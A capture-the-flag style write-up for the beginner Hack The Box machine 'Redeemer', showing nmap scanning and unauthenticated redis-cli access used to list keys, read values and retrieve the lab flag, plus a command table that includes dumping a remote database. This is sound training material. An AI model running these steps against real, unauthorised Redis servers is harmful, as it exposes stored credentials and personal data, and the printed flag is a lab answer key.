# HTB Starting Point — Redeemer Write-up

**Machine:** Redeemer
**Difficulty:** Very Easy
**Category:** Starting Point
**Target IP:** 10.129.254.192 (changes on every spawn)
**Topic focus:** Redis enumeration and unauthenticated access

---

## 1. Objective

Enumerate a target host, identify an exposed Redis database service, connect to it without credentials, and extract stored data (including the flag).

---

## 2. Background: What is Redis?

Redis (**RE**mote **DI**ctionary **S**erver) is an open-source, in-memory, NoSQL key-value data store. A few concepts worth understanding before enumerating one:

- **In-memory database:** unlike traditional databases (MySQL, MongoDB, etc.) that read/write to disk, Redis keeps its dataset in RAM. Since RAM is far faster than disk, this makes read/write operations extremely quick.
- **Common use case — caching:** Redis is frequently used as a caching layer in front of a slower, primary database. An application checks Redis first for a value; if it's not there (a "cache miss"), it falls back to the main database, then stores that result in Redis temporarily so future requests are fast.
- **Key-value structure:** data is stored as simple key → value pairs, organized into numbered logical databases (starting at `db0`).
- **Persistence:** even though it's memory-based, Redis periodically snapshots its dataset to disk so data survives a restart.
- **No authentication by default:** this is the critical security point — out of the box, Redis does **not** require a username or password to connect. If it's exposed on a network without `requirepass` configured, anyone who can reach port `6379` has full read/write access to the database.

This last point is exactly the misconfiguration this machine demonstrates.

---

## 3. Reconnaissance

Confirmed connectivity and scanned all ports:

```bash
ping -c 4 10.129.254.192
nmap -p- -T4 10.129.254.192
```

**Result:**

```
6379/tcp open  redis
```

Only one port was open — Redis's default port, `6379`. (Note: a full `-p-` scan took a while over the VPN; `-T4` sped it up, and `-sV` can be run afterward on just the discovered port if version info is needed.)

---

## 4. Enumeration — Connecting with redis-cli

`redis-cli` is the standard command-line client for interacting with a Redis server. Connected using the `-h` flag to specify the target host:

```bash
redis-cli -h 10.129.254.192
```

This drops straight into an interactive prompt — no login required, confirming the lack of authentication.

### Checking server info

```
10.129.254.192:6379> info
```

Key details pulled from the output:
- `redis_version:5.0.7`
- `os:Linux 5.4.0-77-generic x86_64`
- Under the **Keyspace** section: `db0:keys=4,expires=0,avg_ttl=0` — telling us database `0` holds 4 keys.

### Selecting the database and listing keys

```
10.129.254.192:6379> select 0
OK
10.129.254.192:6379> keys *
1) "numb"
2) "flag"
3) "stor"
4) "temp"
```

`select <index>` switches to a specific logical database, and `keys *` lists every key stored in it — the wildcard `*` matches all key names.

---

## 5. Extracting the Data

Used `get <key>` to read the value behind each key:

```
10.129.254.192:6379> get temp
"1c98492cd337252698d0c5f631dfb7ae"
10.129.254.192:6379> get stor
"e80d635f95686148284526e1980740f8"
10.129.254.192:6379> get numb
"bb2c8a7506ee45cc981eb88bb81dddab"
10.129.254.192:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
```

The `flag` key held the target value directly.

**Flag:** `03e1d2b376c37ab3f5319922053953eb`

(Note: `flag` by itself without `get` throws `ERR unknown command` — Redis commands always need their full syntax, e.g. `get flag`, not just `flag`.)

---

## 6. Useful Redis Commands Reference

| Command | Purpose |
|---|---|
| `redis-cli -h <IP>` | Connect to a remote Redis server |
| `info` | Dump server stats: version, OS, memory, keyspace, uptime, etc. |
| `select <db_index>` | Switch to a specific logical database (default starts at `0`) |
| `keys *` | List every key in the currently selected database |
| `get <key>` | Retrieve the value stored under a key |
| `--scan` | Alternative to `keys *` for listing keys (safer on large production datasets) |
| `--rdb <filename>` | Dump the entire remote database to a local file |
| `redis-cli --help` | Show all available client switches |

---

## 7. Key Takeaways

- **Redis has no authentication by default** — if `requirepass` isn't set in `redis.conf`, anyone who can reach the port has full access. Always check for this on any discovered Redis instance.
- **`info` is the first command to run** on any newly connected Redis session — it immediately reveals version, OS, and how much data exists.
- **`keys *` → `get <key>`** is the core two-step workflow for manually dumping small Redis databases.
- Because Redis is often used for **caching sensitive or session data**, an exposed instance can leak far more than a CTF flag in a real engagement — credentials, tokens, and cached personal data are common finds.
- Full port scans (`-p-`) can take a long time over higher-latency VPN connections — budget time accordingly, or scan top ports first while deciding next steps.
- General workflow to repeat: `ping` → `nmap -p- [-sV]` → identify the service → use the appropriate client tool with no-auth/default-creds as the first thing to try → enumerate and extract.

---

*Write-up by Sounak — HTB Starting Point series*
